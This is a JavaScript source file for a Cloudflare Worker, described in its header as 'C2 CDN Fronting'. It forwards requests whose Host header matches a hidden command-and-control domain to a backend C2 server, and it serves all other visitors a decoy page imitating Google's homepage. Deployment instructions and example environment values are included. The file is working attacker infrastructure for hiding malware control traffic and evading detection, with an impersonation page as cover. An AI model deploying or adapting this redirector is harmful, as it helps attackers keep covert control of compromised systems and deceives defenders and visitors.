/**
 * C2 CDN Fronting — Cloudflare Worker
 *
 * Inspects the Host header of incoming requests.
 * If it matches your hidden C2 domain, forwards the
 * request to your backend C2 server.
 * Otherwise, serves a decoy page (Google homepage clone).
 *
 * Deploy:
 *   wrangler deploy worker.js
 *
 * Environment variables (wrangler.toml or Cloudflare dashboard):
 *   C2_HOST       — The hidden domain used for C2 routing
 *                   (e.g. "c2-api.yourdomain.com")
 *   BACKEND_URL   — Your actual C2 server URL
 *                   (e.g. "http://198.51.100.1:8080")
 */

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const host = request.headers.get("Host") || "";

    // ---- C2 routing: forward to backend ----
    if (host === env.C2_HOST) {
      const backendUrl = env.BACKEND_URL + url.pathname + url.search;

      // Clone the request so we can safely read the body
      const backendReq = new Request(backendUrl, {
        method: request.method,
        headers: request.headers,
        body: request.body,
        redirect: "follow",
      });

      try {
        const backendResp = await fetch(backendReq);
        // Return the backend response as-is
        return backendResp;
      } catch (err) {
        return new Response(
          JSON.stringify({ error: "backend unreachable", detail: err.message }),
          {
            status: 502,
            headers: { "Content-Type": "application/json" },
          }
        );
      }
    }

    // ---- Decoy: serve a Google-like landing page ----
    return new Response(DECOY_HTML, {
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "public, max-age=300",
      },
    });
  },
};

// ──────────────────────────────────────────────
// Decoy HTML — Minimal Google.com look-alike
// ──────────────────────────────────────────────
const DECOY_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      background: #fff;
      color: #222;
    }
    nav {
      width: 100%;
      display: flex;
      justify-content: flex-end;
      padding: 15px 30px;
      font-size: 13px;
    }
    nav a {
      color: #222;
      text-decoration: none;
      margin-left: 18px;
    }
    nav a:hover { text-decoration: underline; }
    .main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      width: 100%;
      max-width: 600px;
    }
    .logo {
      font-size: 80px;
      font-weight: bold;
      letter-spacing: -2px;
      margin-bottom: 25px;
      background: linear-gradient(135deg, #4285f4, #ea4335, #fbbc05, #34a853);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .search-box {
      width: 100%;
      max-width: 584px;
      padding: 12px 20px;
      border: 1px solid #dfe1e5;
      border-radius: 24px;
      font-size: 16px;
      outline: none;
      transition: box-shadow 0.2s;
    }
    .search-box:focus, .search-box:hover {
      box-shadow: 0 1px 6px rgba(32,33,36,.28);
      border-color: rgba(223,225,229,0);
    }
    .buttons {
      margin-top: 25px;
    }
    .buttons button {
      background: #f8f9fa;
      border: 1px solid #f8f9fa;
      border-radius: 4px;
      padding: 10px 16px;
      margin: 0 6px;
      font-size: 14px;
      color: #3c4043;
      cursor: pointer;
    }
    .buttons button:hover {
      border-color: #dadce0;
      box-shadow: 0 1px 1px rgba(0,0,0,.1);
    }
    footer {
      width: 100%;
      padding: 15px 30px;
      background: #f2f2f2;
      font-size: 14px;
      color: #70757a;
      display: flex;
      justify-content: space-between;
    }
    footer a {
      color: #70757a;
      text-decoration: none;
      margin-right: 20px;
    }
    footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <nav>
    <a href="#">Gmail</a>
    <a href="#">Images</a>
  </nav>
  <div class="main">
    <div class="logo">Google</div>
    <input class="search-box" type="text" placeholder="Search Google or type a URL" disabled>
    <div class="buttons">
      <button disabled>Google Search</button>
      <button disabled>I'm Feeling Lucky</button>
    </div>
  </div>
  <footer>
    <div>
      <a href="#">About</a>
      <a href="#">Advertising</a>
      <a href="#">Business</a>
      <a href="#">How Search works</a>
    </div>
    <div>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Settings</a>
    </div>
  </footer>
</body>
</html>`;
